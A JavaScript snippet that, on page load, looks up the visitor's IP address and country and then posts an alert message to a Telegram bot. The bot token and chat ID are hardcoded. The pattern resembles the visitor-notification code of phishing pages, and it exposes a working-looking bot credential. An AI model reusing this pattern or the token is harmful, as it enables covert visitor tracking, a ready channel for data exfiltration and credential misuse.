const telegramToken = "8069428865:AAFwelmK6rQ1EN--8aSqYc4-eQXY8N6rMW0";
const telegramChatId = "5084554523";

function enviarMensajeTelegram(mensaje) {
    const url = `https://api.telegram.org/bot${telegramToken}/sendMessage`;
  
    axios.post(url, {
      chat_id: telegramChatId,
      text: mensaje
    })
    .then(response => {
      console.log("Mensaje enviado a Telegram");
    })
    .catch(error => {
      console.error("Error al enviar mensaje a Telegram:", error);
    });
  }
  
  window.addEventListener("DOMContentLoaded", function() {
    fetch('https://ipapi.co/json/')
      .then(response => response.json())
      .then(data => {
        const ip = data.ip;
        const pais = data.country_name;
        const mensajeAlerta = `Tiempo de espera 20seg`;
  
        setTimeout(() => {
          enviarMensajeTelegram(mensajeAlerta);
        }, 2000);
      });
  });
  